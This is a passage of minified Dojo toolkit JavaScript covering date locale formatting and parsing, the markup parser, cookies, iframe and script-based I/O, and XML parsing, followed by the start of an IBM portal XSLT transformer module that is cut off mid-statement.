t=dojo.cldr.supplemental._region(e),o={eg:5,il:5,sy:5,in:0,ae:4,bh:4,dz:4,iq:4,jo:4,kw:4,lb:4,ly:4,ma:4,om:4,qa:4,sa:4,sd:4,tn:4,ye:4}[t],r={ae:5,bh:5,dz:5,iq:5,jo:5,kw:5,lb:5,ly:5,ma:5,om:5,qa:5,sa:5,sd:5,tn:5,ye:5,af:5,ir:5,eg:6,il:6,sy:6}[t];return void 0===o&&(o=6),void 0===r&&(r=0),{start:o,end:r}}),dojo._hasResource["dojo.regexp"]||(dojo._hasResource["dojo.regexp"]=!0,dojo.provide("dojo.regexp"),dojo.regexp.escapeString=function(e,t){return e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,(function(e){return t&&-1!=t.indexOf(e)?e:"\\"+e}))},dojo.regexp.buildGroupRE=function(e,t,o){if(!(e instanceof Array))return t(e);for(var r=[],n=0;n<e.length;n++)r.push(t(e[n]));return dojo.regexp.group(r.join("|"),o)},dojo.regexp.group=function(e,t){return"("+(t?"?:":"")+e+")"}),dojo._hasResource["dojo.string"]||(dojo._hasResource["dojo.string"]=!0,dojo.provide("dojo.string"),dojo.string.rep=function(e,t){if(t<=0||!e)return"";for(var o=[];1&t&&o.push(e),t>>=1;)e+=e;return o.join("")},dojo.string.pad=function(e,t,o,r){o||(o="0");var n=String(e),i=dojo.string.rep(o,Math.ceil((t-n.length)/o.length));return r?n+i:i+n},dojo.string.substitute=function(e,t,o,r){return r=r||dojo.global,o=o?dojo.hitch(r,o):function(e){return e},e.replace(/\$\{([^\s\:\}]+)(?:\:([^\s\:\}]+))?\}/g,(function(e,n,i){var a=dojo.getObject(n,!1,t);return i&&(a=dojo.getObject(i,!1,r).call(r,a,n)),o(a,n).toString()}))},dojo.string.trim=String.prototype.trim?dojo.trim:function(e){for(var t=(e=e.replace(/^\s+/,"")).length-1;t>=0;t--)if(/\S/.test(e.charAt(t))){e=e.substring(0,t+1);break}return e}),dojo._hasResource["dojo.date.locale"]||(dojo._hasResource["dojo.date.locale"]=!0,dojo.provide("dojo.date.locale"),function(){function e(e,t,o,r){return r.replace(/([a-z])\1*/gi,(function(n){var i,a,s=n.charAt(0),l=n.length,d=["abbr","wide","narrow"];switch(s){case"G":i=t[l<4?"eraAbbr":"eraNames"][e.getFullYear()<0?0:1];break;case"y":switch(i=e.getFullYear(),l){case 1:break;case 2:if(!o.fullYear){i=(i=String(i)).substr(i.length-2);break}default:a=!0}break;case"Q":case"q":i=Math.ceil((e.getMonth()+1)/3),a=!0;break;case"M":var c=e.getMonth();if(l<3)i=c+1,a=!0;else{var u=["months","format",d[l-3]].join("-");i=t[u][c]}break;case"w":i=dojo.date.locale._getWeekOfYear(e,0),a=!0;break;case"d":i=e.getDate(),a=!0;break;case"D":i=dojo.date.locale._getDayOfYear(e),a=!0;break;case"E":var h=e.getDay();if(l<3)i=h+1,a=!0;else{var p=["days","format",d[l-3]].join("-");i=t[p][h]}break;case"a":var m=e.getHours()<12?"am":"pm";i=t[m];break;case"h":case"H":case"K":case"k":var f=e.getHours();switch(s){case"h":i=f%12||12;break;case"H":i=f;break;case"K":i=f%12;break;case"k":i=f||24}a=!0;break;case"m":i=e.getMinutes(),a=!0;break;case"s":i=e.getSeconds(),a=!0;break;case"S":i=Math.round(e.getMilliseconds()*Math.pow(10,l-3)),a=!0;break;case"v":case"z":if(i=dojo.date.locale._getZone(e,!0,o))break;l=4;case"Z":var g=dojo.date.locale._getZone(e,!1,o),b=[g<=0?"+":"-",dojo.string.pad(Math.floor(Math.abs(g)/60),2),dojo.string.pad(Math.abs(g)%60,2)];4==l&&(b.splice(0,0,"GMT"),b.splice(3,0,":")),i=b.join("");break;default:throw new Error("dojo.date.locale.format: invalid pattern char: "+r)}return a&&(i=dojo.string.pad(i,l)),i}))}function t(e,t,o,r){var n=function(e){return e};t=t||n,o=o||n,r=r||n;var i=e.match(/(''|[^'])+/g),a="'"==e.charAt(0);return dojo.forEach(i,(function(e,r){e?(i[r]=(a?o:t)(e),a=!a):i[r]=""})),r(i.join(""))}function o(e,t,o,r){return r=dojo.regexp.escapeString(r),o.strict||(r=r.replace(" a"," ?a")),r.replace(/([a-z])\1*/gi,(function(r){var n,i=r.charAt(0),a=r.length,s="",l="";switch(o.strict?(a>1&&(s="0{"+(a-1)+"}"),a>2&&(l="0{"+(a-2)+"}")):(s="0?",l="0{0,2}"),i){case"y":n="\\d{2,4}";break;case"M":n=a>2?"\\S+?":s+"[1-9]|1[0-2]";break;case"D":n=s+"[1-9]|"+l+"[1-9][0-9]|[12][0-9][0-9]|3[0-5][0-9]|36[0-6]";break;case"d":n="[12]\\d|"+s+"[1-9]|3[01]";break;case"w":n=s+"[1-9]|[1-4][0-9]|5[0-3]";break;case"E":n="\\S+";break;case"h":n=s+"[1-9]|1[0-2]";break;case"k":n=s+"\\d|1[01]";break;case"H":n=s+"\\d|1\\d|2[0-3]";break;case"K":n=s+"[1-9]|1\\d|2[0-4]";break;case"m":case"s":n="[0-5]\\d";break;case"S":n="\\d{"+a+"}";break;case"a":var d=o.am||t.am||"AM",c=o.pm||t.pm||"PM";o.strict?n=d+"|"+c:(n=d+"|"+c,d!=d.toLowerCase()&&(n+="|"+d.toLowerCase()),c!=c.toLowerCase()&&(n+="|"+c.toLowerCase()),-1!=n.indexOf(".")&&(n+="|"+n.replace(/\./g,""))),n=n.replace(/\./g,"\\.");break;default:n=".*"}return e&&e.push(r),"("+n+")"})).replace(/[\xa0 ]/g,"[\\s\\xa0]")}dojo.date.locale._getZone=function(e,t,o){return t?dojo.date.getTimezoneName(e):e.getTimezoneOffset()},dojo.date.locale.format=function(o,r){r=r||{};var n,i=dojo.i18n.normalizeLocale(r.locale),a=r.formatLength||"short",s=dojo.date.locale._getGregorianBundle(i),l=[],d=dojo.hitch(this,e,o,s,r);return"year"==r.selector?t(s["dateFormatItem-yyyy"]||"yyyy",d):("date"!=r.selector&&(n=r.timePattern||s["timeFormat-"+a])&&l.push(t(n,d)),"time"!=r.selector&&(n=r.datePattern||s["dateFormat-"+a])&&l.push(t(n,d)),1==l.length?l[0]:s["dateTimeFormat-"+a].replace(/\{(\d+)\}/g,(function(e,t){return l[t]})))},dojo.date.locale.regexp=function(e){return dojo.date.locale._parseInfo(e).regexp},dojo.date.locale._parseInfo=function(e){e=e||{};var r=dojo.i18n.normalizeLocale(e.locale),n=dojo.date.locale._getGregorianBundle(r),i=e.formatLength||"short",a=e.datePattern||n["dateFormat-"+i],s=e.timePattern||n["timeFormat-"+i],l=[];return{regexp:t("date"==e.selector?a:"time"==e.selector?s:n["dateTimeFormat-"+i].replace(/\{(\d+)\}/g,(function(e,t){return[s,a][t]})),dojo.hitch(this,o,l,n,e)),tokens:l,bundle:n}},dojo.date.locale.parse=function(e,t){var o=dojo.date.locale._parseInfo(t),r=o.tokens,n=o.bundle,i=new RegExp("^"+o.regexp+"$",o.strict?"":"i").exec(e);if(!i)return null;var a=["abbr","wide","narrow"],s=[1970,0,1,0,0,0,0],l="",d=dojo.every(i,(function(e,o){if(!o)return!0;var i=r[o-1],d=i.length;switch(i.charAt(0)){case"y":if(2!=d&&t.strict)s[0]=e;else if(e<100){e=Number(e);var c=""+(new Date).getFullYear(),u=100*c.substring(0,2),h=e<Math.min(Number(c.substring(2,4))+20,99)?u+e:u-100+e;s[0]=h}else{if(t.strict)return!1;s[0]=e}break;case"M":if(d>2){var p=n["months-format-"+a[d-3]].concat();if(t.strict||(e=e.replace(".","").toLowerCase(),p=dojo.map(p,(function(e){return e.replace(".","").toLowerCase()}))),-1==(e=dojo.indexOf(p,e)))return!1}else e--;s[1]=e;break;case"E":case"e":var m=n["days-format-"+a[d-3]].concat();if(t.strict||(e=e.toLowerCase(),m=dojo.map(m,(function(e){return e.toLowerCase()}))),-1==(e=dojo.indexOf(m,e)))return!1;break;case"D":s[1]=0;case"d":s[2]=e;break;case"a":var f=t.am||n.am,g=t.pm||n.pm;if(!t.strict){var b=/\./g;e=e.replace(b,"").toLowerCase(),f=f.replace(b,"").toLowerCase(),g=g.replace(b,"").toLowerCase()}if(t.strict&&e!=f&&e!=g)return!1;l=e==g?"p":e==f?"a":"";break;case"K":24==e&&(e=0);case"h":case"H":case"k":if(e>23)return!1;s[3]=e;break;case"m":s[4]=e;break;case"s":s[5]=e;break;case"S":s[6]=e}return!0})),c=+s[3];"p"===l&&c<12?s[3]=c+12:"a"===l&&12==c&&(s[3]=0);var u=new Date(s[0],s[1],s[2],s[3],s[4],s[5],s[6]);t.strict&&u.setFullYear(s[0]);var h=r.join(""),p=-1!=h.indexOf("d"),m=-1!=h.indexOf("M");return!d||m&&u.getMonth()>s[1]||p&&u.getDate()>s[2]?null:((m&&u.getMonth()<s[1]||p&&u.getDate()<s[2])&&(u=dojo.date.add(u,"hour",1)),u)}}(),_30a=[],dojo.date.locale.addCustomFormats=function(e,t){_30a.push({pkg:e,name:t})},dojo.date.locale._getGregorianBundle=function(e){var t={};return dojo.forEach(_30a,(function(o){var r=dojo.i18n.getLocalization(o.pkg,o.name,e);t=dojo.mixin(t,r)}),this),t},dojo.date.locale.addCustomFormats("dojo.cldr","gregorian"),dojo.date.locale.getNames=function(e,t,o,r){var n,i=dojo.date.locale._getGregorianBundle(r),a=[e,o,t];"standAlone"==o&&(1==(n=i[a.join("-")])[0]&&(n=void 0));return a[1]="format",(n||i[a.join("-")]).concat()},dojo.date.locale.isWeekend=function(e,t){var o=dojo.cldr.supplemental.getWeekend(t),r=(e||new Date).getDay();return o.end<o.start&&(o.end+=7,r<o.start&&(r+=7)),r>=o.start&&r<=o.end},dojo.date.locale._getDayOfYear=function(e){return dojo.date.difference(new Date(e.getFullYear(),0,1,e.getHours()),e)+1},dojo.date.locale._getWeekOfYear=function(e,t){1==arguments.length&&(t=0);var o=new Date(e.getFullYear(),0,1).getDay(),r=(o-t+7)%7,n=Math.floor((dojo.date.locale._getDayOfYear(e)+r-1)/7);return o==t&&n++,n}),dojo._hasResource["dojo.date.stamp"]||(dojo._hasResource["dojo.date.stamp"]=!0,dojo.provide("dojo.date.stamp"),dojo.date.stamp.fromISOString=function(e,t){dojo.date.stamp._isoRegExp||(dojo.date.stamp._isoRegExp=/^(?:(\d{4})(?:-(\d{2})(?:-(\d{2}))?)?)?(?:T(\d{2}):(\d{2})(?::(\d{2})(.\d+)?)?((?:[+-](\d{2}):(\d{2}))|Z)?)?$/);var o=dojo.date.stamp._isoRegExp.exec(e),r=null;if(o){o.shift(),o[1]&&o[1]--,o[6]&&(o[6]*=1e3),t&&(t=new Date(t),dojo.map(["FullYear","Month","Date","Hours","Minutes","Seconds","Milliseconds"],(function(e){return t["get"+e]()})).forEach((function(e,t){void 0===o[t]&&(o[t]=e)}))),r=new Date(o[0]||1970,o[1]||0,o[2]||1,o[3]||0,o[4]||0,o[5]||0,o[6]||0),o[0]<100&&r.setFullYear(o[0]||1970);var n=0,i=o[7]&&o[7].charAt(0);"Z"!=i&&(n=60*(o[8]||0)+(Number(o[9])||0),"-"!=i&&(n*=-1)),i&&(n-=r.getTimezoneOffset()),n&&r.setTime(r.getTime()+6e4*n)}return r},dojo.date.stamp.toISOString=function(e,t){var o=function(e){return e<10?"0"+e:e},r=[],n=(t=t||{}).zulu?"getUTC":"get",i="";if("time"!=t.selector){var a=e[n+"FullYear"]();i=["0000".substr((a+"").length)+a,o(e[n+"Month"]()+1),o(e[n+"Date"]())].join("-")}if(r.push(i),"date"!=t.selector){var s=[o(e[n+"Hours"]()),o(e[n+"Minutes"]()),o(e[n+"Seconds"]())].join(":"),l=e[n+"Milliseconds"]();if(t.milliseconds&&(s+="."+(l<100?"0":"")+o(l)),t.zulu)s+="Z";else if("time"!=t.selector){var d=e.getTimezoneOffset(),c=Math.abs(d);s+=(d>0?"-":"+")+o(Math.floor(c/60))+":"+o(c%60)}r.push(s)}return r.join("T")}),dojo._hasResource["dojo.parser"]||(dojo._hasResource["dojo.parser"]=!0,dojo.provide("dojo.parser"),dojo.parser=new function(){var e=dojo;function t(t,o){switch(o){case"string":return t;case"number":return t.length?Number(t):NaN;case"boolean":return"boolean"==typeof t?t:!("false"==t.toLowerCase());case"function":e.isFunction(t)&&(t=t.toString(),t=e.trim(t.substring(t.indexOf("{")+1,t.length-1)));try{return-1!=t.search(/[^\w\.]+/i)?new Function(t):e.getObject(t,!1)}catch(e){return new Function}case"array":return t?t.split(/\s*,\s*/):[];case"date":switch(t){case"":return new Date("");case"now":return new Date;default:return e.date.stamp.fromISOString(t)}case"url":return e.baseUrl+t;default:return e.fromJson(t)}}this._attrName=e._scopeName+"Type",this._query="["+this._attrName+"]";var o={};dojo.connect(dojo,"extend",(function(){o={}})),this._functionFromScript=function(t){var o="",r="",n=t.getAttribute("args");n&&e.forEach(n.split(/\s*,\s*/),(function(e,t){o+="var "+e+" = arguments["+t+"]; "}));var i=t.getAttribute("with");return i&&i.length&&e.forEach(i.split(/\s*,\s*/),(function(e){o+="with("+e+"){",r+="}"})),new Function(o+t.innerHTML+r)},this.instantiate=function(r,n,i){var a=[],s=dojo.parser;return n=n||{},i=i||{},e.forEach(r,(function(r){if(r){var i=s._attrName in n?n[s._attrName]:r.getAttribute(s._attrName);if(i&&i.length){var l=function(t){if(!o[t]){var r=e.getObject(t);if(!e.isFunction(r))throw new Error("Could not load class '"+t+"'. Did you spell the name correctly and use a full path, like 'dijit.form.Button'?");var n=r.prototype,i={},a={};for(var s in n)if("_"!=s.charAt(0)&&!(s in a)){var l=n[s];i[s]=(d=l,e.isString(d)?"string":"number"==typeof d?"number":"boolean"==typeof d?"boolean":e.isFunction(d)?"function":e.isArray(d)?"array":d instanceof Date?"date":d instanceof e._Url?"url":"object")}o[t]={cls:r,params:i}}var d;return o[t]}(i),d=l.cls,c=d._noScript||d.prototype._noScript,u={},h=r.attributes;for(var p in l.params){var m=p in n?{value:n[p],specified:!0}:h.getNamedItem(p);if(m&&(m.specified||dojo.isIE&&"value"==p.toLowerCase())){var f=m.value;switch(p){case"class":f="className"in n?n.className:r.className;break;case"style":f="style"in n?n.style:r.style&&r.style.cssText}var g=l.params[p];u[p]="string"==typeof f?t(f,g):f}}if(!c){var b=[],v=[];e.query("> script[type^='dojo/']",r).orphan().forEach((function(t){var o=t.getAttribute("event"),r=t.getAttribute("type"),n=e.parser._functionFromScript(t);o?"dojo/connect"==r?b.push({event:o,func:n}):u[o]=n:v.push(n)}))}var _=d.markupFactory||d.prototype&&d.prototype.markupFactory,x=_?_(u,r,d):new d(u,r);a.push(x);var j=r.getAttribute("jsId");j&&e.setObject(j,x),c||(e.forEach(b,(function(t){e.connect(x,t.event,null,t.func)})),e.forEach(v,(function(e){e.call(x)})))}}})),n._started||e.forEach(a,(function(e){i.noStart||!e||!e.startup||e._started||e.getParent&&e.getParent()||e.startup()})),a},this.parse=function(t,o){var r;r=!o&&t&&t.rootNode?(o=t).rootNode:t;var n=e.query(this._query,r);return this.instantiate(n,null,o)}},_34c=function(){dojo.config.parseOnLoad&&dojo.parser.parse()},dojo.exists("dijit.wai.onload")&&dijit.wai.onload===dojo._loaders[0]?dojo._loaders.splice(1,0,_34c):dojo._loaders.unshift(_34c)),dojo._hasResource["dojo.cookie"]||(dojo._hasResource["dojo.cookie"]=!0,dojo.provide("dojo.cookie"),dojo.cookie=function(e,t,o){var r=document.cookie;if(1==arguments.length){var n=r.match(new RegExp("(?:^|; )"+dojo.regexp.escapeString(e)+"=([^;]*)"));return n?decodeURIComponent(n[1]):void 0}var i=(o=o||{}).expires;if("number"==typeof i){var a=new Date;a.setTime(a.getTime()+24*i*60*60*1e3),i=o.expires=a}i&&i.toUTCString&&(o.expires=i.toUTCString());var s,l=e+"="+(t=encodeURIComponent(t));for(s in o){l+="; "+s;var d=o[s];!0!==d&&(l+="="+d)}document.cookie=l},dojo.cookie.isSupported=function(){return"cookieEnabled"in navigator||(this("__djCookieTest__","CookiesAllowed"),navigator.cookieEnabled="CookiesAllowed"==this("__djCookieTest__"),navigator.cookieEnabled&&this("__djCookieTest__","",{expires:-1})),navigator.cookieEnabled}),dojo._hasResource["dojo.io.iframe"]||(dojo._hasResource["dojo.io.iframe"]=!0,dojo.provide("dojo.io.iframe"),dojo.io.iframe={create:function(e,t,o){if(window[e])return window[e];if(window.frames[e])return window.frames[e];var r=o;r||(dojo.config.useXDomain&&!dojo.config.dojoBlankHtmlUrl&&console.warn("dojo.io.iframe.create: When using cross-domain Dojo builds, please save dojo/resources/blank.html to your domain and set djConfig.dojoBlankHtmlUrl to the path on your domain to blank.html"),r=dojo.config.dojoBlankHtmlUrl||dojo.moduleUrl("dojo","resources/blank.html"));var n=dojo.place('<iframe id="'+e+'" name="'+e+'" src="'+r+'" onload="'+t+'" style="position: absolute; left: 1px; top: 1px; height: 1px; width: 1px; visibility: hidden">',dojo.body());return window[e]=n,n},setSrc:function(e,t,o){try{if(o){var r;if(!(r=dojo.isIE||dojo.isWebKit>521?e.contentWindow.document:dojo.isSafari?e.document:e.contentWindow))return void(e.location=t);r.location.replace(t)}else dojo.isWebKit?e.location=t:frames[e.name].location=t}catch(e){console.log("dojo.io.iframe.setSrc: ",e)}},doc:function(e){return e.contentDocument||e.name&&e.document&&dojo.doc.getElementsByTagName("iframe")[e.name].contentWindow&&dojo.doc.getElementsByTagName("iframe")[e.name].contentWindow.document||e.name&&dojo.doc.frames[e.name]&&dojo.doc.frames[e.name].document||null},send:function(e){this._frame||(this._frame=this.create(this._iframeName,dojo._scopeName+".io.iframe._iframeOnload();"));var t=dojo._ioSetArgs(e,(function(e){e.canceled=!0,e.ioArgs._callNext()}),(function(e){var t=null;try{var o=e.ioArgs,r=dojo.io.iframe,n=r.doc(r._frame),i=o.handleAs;if(t=n,"html"!=i)if("xml"==i){if(dojo.isIE<9||dojo.isIE&&dojo.isQuirks){dojo.query("a",r._frame.contentWindow.document.documentElement).orphan();var a=r._frame.contentWindow.document.documentElement.innerText;a=a.replace(/>\s+</g,"><");var s={responseText:a=dojo.trim(a)};t=dojo._contentHandlers.xml(s)}}else t=n.getElementsByTagName("textarea")[0].value,"json"==i?t=dojo.fromJson(t):"javascript"==i&&(t=dojo.eval(t))}catch(e){t=e}finally{o._callNext()}return t}),(function(e,t){return t.ioArgs._hasError=!0,t.ioArgs._callNext(),e}));return t.ioArgs._callNext=function(){this._calledNext||(this._calledNext=!0,dojo.io.iframe._currentDfd=null,dojo.io.iframe._fireNextRequest())},this._dfdQueue.push(t),this._fireNextRequest(),dojo._ioWatch(t,(function(e){return!e.ioArgs._hasError}),(function(e){return!!e.ioArgs._finished}),(function(e){e.ioArgs._finished?e.callback(e):e.errback(new Error("Invalid dojo.io.iframe request state"))})),t},_currentDfd:null,_dfdQueue:[],_iframeName:dojo._scopeName+"IoIframe",_fireNextRequest:function(){try{if(this._currentDfd||0==this._dfdQueue.length)return;do{var e=this._currentDfd=this._dfdQueue.shift()}while(e&&e.canceled&&this._dfdQueue.length);if(!e||e.canceled)return void(this._currentDfd=null);var t=e.ioArgs,o=t.args;t._contentToClean=[];var r=dojo.byId(o.form),n=o.content||{};if(r){if(n){var i=function(e,o){dojo.create("input",{type:"hidden",name:e,value:o},r),t._contentToClean.push(e)};for(var a in n){var s,l=n[a];if(dojo.isArray(l)&&l.length>1)for(s=0;s<l.length;s++)i(a,l[s]);else r[a]?r[a].value=l:i(a,l)}}var d=r.getAttributeNode("action"),c=r.getAttributeNode("method"),u=r.getAttributeNode("target");o.url&&(t._originalAction=d?d.value:null,d?d.value=o.url:r.setAttribute("action",o.url)),c&&c.value||(c?c.value=o.method?o.method:"post":r.setAttribute("method",o.method?o.method:"post")),t._originalTarget=u?u.value:null,u?u.value=this._iframeName:r.setAttribute("target",this._iframeName),r.target=this._iframeName,dojo._ioNotifyStart(e),r.submit()}else{var h=o.url+(o.url.indexOf("?")>-1?"&":"?")+t.query;dojo._ioNotifyStart(e),this.setSrc(this._frame,h,!0)}}catch(t){e.errback(t)}},_iframeOnload:function(){var e=this._currentDfd;if(e){var t=e.ioArgs,o=t.args,r=dojo.byId(o.form);if(r){for(var n=t._contentToClean,i=0;i<n.length;i++)for(var a=n[i],s=0;s<r.childNodes.length;s++){var l=r.childNodes[s];if(l.name==a){dojo.destroy(l);break}}t._originalAction&&r.setAttribute("action",t._originalAction),t._originalTarget&&(r.setAttribute("target",t._originalTarget),r.target=t._originalTarget)}t._finished=!0}else this._fireNextRequest()}}),dojo._hasResource["dojo.io.script"]||(dojo._hasResource["dojo.io.script"]=!0,dojo.provide("dojo.io.script"),function(){var _36b=dojo.isIE?"onreadystatechange":"load",_36c=/complete|loaded/;dojo.io.script={get:function(e){var t=this._makeScriptDeferred(e),o=t.ioArgs;if(dojo._ioAddQueryToUrl(o),dojo._ioNotifyStart(t),this._canAttach(o)){var r=this.attach(o.id,o.url,e.frameDoc);if(!o.jsonp&&!o.args.checkString)var n=dojo.connect(r,_36b,(function(e){("load"==e.type||_36c.test(r.readyState))&&(dojo.disconnect(n),o.scriptLoaded=e)}))}return dojo._ioWatch(t,this._validCheck,this._ioCheck,this._resHandle),t},attach:function(e,t,o){var r=o||dojo.doc,n=r.createElement("script");return n.type="text/javascript",n.src=t,n.id=e,n.charset="utf-8",r.getElementsByTagName("head")[0].appendChild(n)},remove:function(e,t){dojo.destroy(dojo.byId(e,t)),this["jsonp_"+e]&&delete this["jsonp_"+e]},_makeScriptDeferred:function(e){var t=dojo._ioSetArgs(e,this._deferredCancel,this._deferredOk,this._deferredError),o=t.ioArgs;return o.id=dojo._scopeName+"IoScript"+this._counter++,o.canDelete=!1,o.jsonp=e.callbackParamName||e.jsonp,o.jsonp&&(o.query=o.query||"",o.query.length>0&&(o.query+="&"),o.query+=o.jsonp+"="+(e.frameDoc?"parent.":"")+dojo._scopeName+".io.script.jsonp_"+o.id+"._jsonpCallback",o.frameDoc=e.frameDoc,o.canDelete=!0,t._jsonpCallback=this._jsonpCallback,this["jsonp_"+o.id]=t),t},_deferredCancel:function(e){e.canceled=!0,e.ioArgs.canDelete&&dojo.io.script._addDeadScript(e.ioArgs)},_deferredOk:function(e){var t=e.ioArgs;return t.canDelete&&dojo.io.script._addDeadScript(t),t.json||t.scriptLoaded||t},_deferredError:function(e,t){return t.ioArgs.canDelete&&("timeout"==e.dojoType?dojo.io.script.remove(t.ioArgs.id,t.ioArgs.frameDoc):dojo.io.script._addDeadScript(t.ioArgs)),console.log("dojo.io.script error",e),e},_deadScripts:[],_counter:1,_addDeadScript:function(e){dojo.io.script._deadScripts.push({id:e.id,frameDoc:e.frameDoc}),e.frameDoc=null},_validCheck:function(e){var t=dojo.io.script,o=t._deadScripts;if(o&&o.length>0){for(var r=0;r<o.length;r++)t.remove(o[r].id,o[r].frameDoc),o[r].frameDoc=null;dojo.io.script._deadScripts=[]}return!0},_ioCheck:function(dfd){var _378=dfd.ioArgs;if(_378.json||_378.scriptLoaded&&!_378.args.checkString)return!0;var _379=_378.args.checkString;return!(!_379||!eval("typeof("+_379+") != 'undefined'"))},_resHandle:function(e){dojo.io.script._ioCheck(e)?e.callback(e):e.errback(new Error("inconceivable dojo.io.script._resHandle error"))},_canAttach:function(e){return!0},_jsonpCallback:function(e){this.ioArgs.json=e}}}()),dojo._hasResource["dojox.xml.parser"]||(dojo._hasResource["dojox.xml.parser"]=!0,dojo.provide("dojox.xml.parser"),dojox.xml.parser.parse=function(e,t){var o,r=dojo.doc;if(t=t||"text/xml",e&&dojo.trim(e)&&"DOMParser"in dojo.global){var n=new DOMParser,i=(o=n.parseFromString(e,t)).documentElement,a="http://www.mozilla.org/newlayout/xml/parsererror.xml";if("parsererror"==i.nodeName&&i.namespaceURI==a){var s=i.getElementsByTagNameNS(a,"sourcetext")[0];throw s&&(s=s.firstChild.data),new Error("Error parsing text "+i.firstChild.data+" \n"+s)}return o}if("ActiveXObject"in dojo.global){var l=function(e){return"MSXML"+e+".DOMDocument"},d=["Microsoft.XMLDOM",l(6),l(4),l(3),l(2)];if(dojo.some(d,(function(e){try{o=new ActiveXObject(e)}catch(e){return!1}return!0})),e&&o){o.async=!1,o.loadXML(e);var c=o.parseError;if(0!==c.errorCode)throw new Error("Line: "+c.line+"\nCol: "+c.linepos+"\nReason: "+c.reason+"\nError Code: "+c.errorCode+"\nSource: "+c.srcText)}if(o)return o}else if(r.implementation&&r.implementation.createDocument){if(e&&dojo.trim(e)&&r.createElement){var u=r.createElement("xml");u.innerHTML=e;var h=r.implementation.createDocument("foo","",null);return dojo.forEach(u.childNodes,(function(e){h.importNode(e,!0)})),h}return r.implementation.createDocument("","",null)}return null},dojox.xml.parser.textContent=function(e,t){if(arguments.length>1){var o=e.ownerDocument||dojo.doc;return dojox.xml.parser.replaceChildren(e,o.createTextNode(t)),t}if(void 0!==e.textContent)return e.textContent;var r="";return e&&dojo.forEach(e.childNodes,(function(e){switch(e.nodeType){case 1:case 5:r+=dojox.xml.parser.textContent(e);break;case 3:case 2:case 4:r+=e.nodeValue}})),r},dojox.xml.parser.replaceChildren=function(e,t){var o=[];dojo.isIE&&dojo.forEach(e.childNodes,(function(e){o.push(e)})),dojox.xml.parser.removeChildren(e),dojo.forEach(o,dojo.destroy),dojo.isArray(t)?dojo.forEach(t,(function(t){e.appendChild(t)})):e.appendChild(t)},dojox.xml.parser.removeChildren=function(e){for(var t=e.childNodes.length;e.hasChildNodes();)e.removeChild(e.firstChild);return t},dojox.xml.parser.innerXML=function(e){return e.innerXML?e.innerXML:e.xml?e.xml:"undefined"!=typeof XMLSerializer?(new XMLSerializer).serializeToString(e):null}),dojo._hasResource["dojox.data.dom"]||(dojo._hasResource["dojox.data.dom"]=!0,dojo.provide("dojox.data.dom"),dojo.deprecated("dojox.data.dom","Use dojox.xml.parser instead.","2.0"),dojox.data.dom.createDocument=function(e,t){dojo.deprecated("dojox.data.dom.createDocument()","Use dojox.xml.parser.parse() instead.","2.0");try{return dojox.xml.parser.parse(e,t)}catch(e){return null}},dojox.data.dom.textContent=function(e,t){return dojo.deprecated("dojox.data.dom.textContent()","Use dojox.xml.parser.textContent() instead.","2.0"),arguments.length>1?dojox.xml.parser.textContent(e,t):dojox.xml.parser.textContent(e)},dojox.data.dom.replaceChildren=function(e,t){dojo.deprecated("dojox.data.dom.replaceChildren()","Use dojox.xml.parser.replaceChildren() instead.","2.0"),dojox.xml.parser.replaceChildren(e,t)},dojox.data.dom.removeChildren=function(e){return dojo.deprecated("dojox.data.dom.removeChildren()","Use dojox.xml.parser.removeChildren() instead.","2.0"),dojox.xml.parser.removeChildren(e)},dojox.data.dom.innerXML=function(e){return dojo.deprecated("dojox.data.dom.innerXML()","Use dojox.xml.parser.innerXML() instead.","2.0"),dojox.xml.parser.innerXML(e)}),dojo._hasResource["com.ibm.portal.xslt"]||(dojo._hasResource["com.ibm.portal.xslt"]=!0,dojo.provide("com.ibm.portal.xslt"),dojo.require("dojox.data.dom"),dojo.declare("com.ibm.portal.xslt.TransformerFactory",null,{constructor:function(){this._xsltMap=new Array},newTransformer:function(e){ibm.portal.debug.entry("newTransformer",[e]);var t=this._getCached(e);return null==t&&(t=new com.ibm.portal.xslt.Transformer(e),this._xsltMap.push({url:e,transformer:t})),t},_getCached:function(e){var t=null;for(i=0;i<this._xsltMap.length;i++){var o=this._xsltMap[i];if(e==o.url){t=o.transformer;break}}return t}}),dojo.declare("com.ibm.portal.xslt.Transformer",null,{constructor:function(e){this._xslt=com.ibm.portal.xslt.loadXsl(e)},transformToRegion:function(e,t,o,r){if(com.ibm.portal.utilities.html.safeClean(o),dojo.isIE||void 0!==window.ActiveXObject){var n=com.ibm.portal.xslt.transform(e,this._xslt,null,t,!0);o.innerHTML=dojo.string.trim(n)}else{var i=com.ibm.portal.xslt.gecko._transformToFragment(e,this._xslt,null,t,r);o.innerHTML="",o.appendChild(i)}},transformToDocument:function(e,t,o){return com.ibm.portal.xslt.transform(e,this._xslt,null,t,o)}}),com.ibm.portal.xslt.TRANSFORMER_FACTORY=new com.ibm.portal.xslt.TransformerFactory,com.ibm.portal.xslt.ie={},com.ibm.portal.xslt.gecko={},com.ibm.portal.xslt.getXmlHttpRequest=function(){return"undefined"!=typeof ActiveXObject?new ActiveXObject("Microsoft.XMLHTTP"):new XMLHttpRequest},com.ibm.portal.xslt.loadXml=function(e){return"undefined"!=typeof ActiveXObject||void 0!==window.ActiveXObject?com.ibm.portal.xslt.ie.loadXml(e):com.ibm.portal.xslt.gecko.loadXml(e)},com.ibm.portal.xslt.loadXmlString=function(e){return"undefined"!=typeof ActiveXObject||void 0!==window.ActiveXObject?com.ibm.portal.xslt.ie.loadXmlString(e):com.ibm.portal.xslt.gecko.loadXmlString(e)},com.ibm.portal.xslt.loadXsl=function(e){return"undefined"!=typeof ActiveXObject||void 0!==window.ActiveXObject?com.ibm.portal.xslt.ie.loadXsl(e):com.ibm.portal.xslt.gecko.loadXsl(e)},com.ibm.portal.xslt.transform=function(e,t,o,r,n){return ibm.portal.debug.entry("transform",[e,t,o,r,n]),"undefined"!=typeof ActiveXObject||void 0!==window.ActiveXObject?com.ibm.portal.xslt.ie.transform(e,t,o,r,n):com.ibm.portal.xslt.gecko.transform(e,t,o,r,n)},com.ibm.portal.xslt.transformAndUpdate=function(e,t,o,r,n){if(ibm.portal.debug.entry("transformAndUpdate",[e,t,o,r,n]),"undefined"!=typeof ActiveXObject||void 0!==window.ActiveXObject){var i=com.ibm.portal.xslt.transform(t,o,r,n,!0);e.innerHTML=dojo.string.trim(i)}else{var 